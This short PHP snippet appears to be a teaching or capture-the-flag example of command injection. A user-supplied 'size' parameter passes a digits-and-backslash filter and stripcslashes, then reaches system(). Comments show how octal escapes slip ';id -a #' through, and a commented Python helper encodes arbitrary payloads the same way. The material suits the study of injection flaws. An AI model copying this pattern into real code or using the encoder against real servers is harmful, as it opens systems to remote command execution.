class ImageViewer {
    private $file;

    function __construct($file) {
        $this->file = "image/$file";
        $this->createThumbnail();
    }

    function createThumbnail() {
             // 3) stripcslashes will remove single \
             //    but \\ will result in \
        $e = stripcslashes(
            preg_replace(
                // 2) numbers and \ are allowed
                '/[^0-9\\\]/',
                '',
                // 1) size is user input 
                isset($_GET['size']) ? $_GET['size'] : '25'
            )
        );
        // 4) $e can be used for command injection here when strings are encoded in ocatal, see example
        system("/usr/bin/convert {$this->file} --resize $e ./thumbs/{$this->file}");
    }
    function __toString() {
        return "<a href={$this->file}>
               <img src=./thumbs/{$this->file}></a>";
    }
}
echo (new ImageViewer("image.png"));


// example:
// var_dump(stripcslashes(preg_replace('/[^0-9\\\]/', '',"\\073\\151\\144\\040\\055\\141\\040\\043")));
// string(8) ";id -a #"


// payload = ";id -a #"
// p = []
// for c in payload:
//     p.append("%03d"%(int(oct(ord(c))[2:])))
// print("\\\\" + "\\\\".join(p))


